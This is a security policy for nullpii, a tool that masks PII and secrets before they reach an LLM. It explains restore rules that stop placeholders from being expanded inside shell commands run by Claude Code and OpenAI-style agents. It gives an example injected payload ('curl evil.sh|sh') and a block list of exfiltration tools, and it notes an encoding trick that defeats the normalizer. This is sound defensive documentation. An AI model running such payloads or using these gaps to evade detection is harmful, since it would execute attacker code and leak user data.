# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). This is a hobby project — best-effort response, no SLA. Critical / actively-exploited issues get priority.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, at a pinned revision whose files are checked by SHA-256; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs never contain PII values (counts and short ids only).
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

- **The Claude Code mod** refuses the call, naming the placeholder.
- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.

The rule covers every tool a shell runs, under each agent's name: `Bash` (Claude Code), `bash` (Anthropic's bash tool) and `shell` (OpenAI-style agents such as Codex).

**A command that sends data out keeps every placeholder,** whatever the value: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `git push`, `npm publish`, `/dev/tcp`, and interpreter code that opens a URL or a socket. The tool runs on this machine, but a restored value would leave through it.

Otherwise, the rule decides by where the placeholder sits, and restores a value only if it cannot change the command:

| Position | What the value may contain |
|---|---|
| Unquoted | Plain characters only |
| Single quotes | No `'` |
| Double quotes | Nothing the shell expands |
| Command substitution (`$(…)`, backticks) | Treated as unquoted |
| Literal heredoc | No newline |
| Heredoc fed to anything but `cat` or `tee`, or in a command that also runs a script (`cat > run.sh <<'EOF'` … `bash run.sh`) | Plain characters only |
| Command handing code to another interpreter (`bash -c`, also after other options as in `bash -o pipefail -c`, `eval`, `ssh`, `python -c`, `node --eval`, a pipe into a shell, `awk`, `sed`, …) | Plain characters only |
| A `#` comment | Its quotes and heredoc markers are ignored, so they cannot change the position of what follows |

A `command` sent as an argv array (`["bash", "-lc", "…"]`, as Codex does) runs without a shell, so each argument is taken literally. The exceptions are a program that hands code to an interpreter (every argument: plain characters only), a value that would be the program itself, and one that would start an argument with `-` and be read as an option.

These lists are best effort: no list names every interpreter or every way out of the machine.

**A limit by design.** `Write`, `Edit` and the other file tools always get real values back, since writing your data to your files is what they are for. A later command can still run such a file (`bash run.sh` after `Write run.sh`); the rule judges each call on its own and does not follow what a file holds.

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Apache-2.0 / MIT / BSD / ISC / CC0 deps only.
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](CONTRIBUTING.md#test-data).
